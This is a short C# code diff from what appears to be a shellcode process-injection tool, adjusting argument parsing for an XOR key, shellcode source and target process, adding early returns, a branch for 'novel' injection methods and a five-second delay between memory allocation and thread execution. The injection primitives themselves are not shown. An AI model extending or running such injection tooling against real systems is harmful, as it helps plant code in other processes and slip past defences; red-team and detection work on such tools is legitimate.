@@ -140,7 +140,8 @@ ThreadExec Options
                     memOption = int.Parse(args[1]); //Int.TryParse(args[1]);
                     execOption = int.Parse(args[2]);
                     xorkey = args[3];
-                    binSrcType = args[4];
+                    binSrcType = Enum.Parse(typeof(sourceLocation), args[4]).ToString();
+                    // Enum.Parse(typeof(sourceLocation), binSrcType);
                     binSrcPath = args[5];
                     Console.WriteLine("     Shellcode will be called from {0} located at {1}", binSrcType, binSrcPath);
                     Pid = int.Parse(args[6]);
@@ -156,14 +157,22 @@ ThreadExec Options
                 }
                 catch (Exception ex) {
                     Console.WriteLine($"[-] Other exception : {ex.Message}");
+                    return;
                 }
                 IntPtr memoryResponse = IntPtr.Zero;
                 Process pidResp = null;
+                if (memOption >= 400 && memOption <= 499 || execOption >= 400 && execOption <= 499)
+                {
+                    // Special method, might not be following the standard 3 primitives for remote process injection
+                    Console.WriteLine("     Novel injection method selected");
+                }
                 (memoryResponse, pidResp) = memory.SelectMemOption(memOption, execOption, xorkey, binSrcType, binSrcPath, Pid, Tid);
                 if (memoryResponse == IntPtr.Zero) { Console.WriteLine("[-] Failed to allocate memory, received and IntPtr 0 instead of a memory address"); }
                 else
                 {
+                    System.Threading.Thread.Sleep(5000); // Play with the idea of a configurable delay between operations
                     threadexec.SelectThreadOption(memoryResponse, execOption, pidResp, Tid);
+                    return;
                 }
             }
  
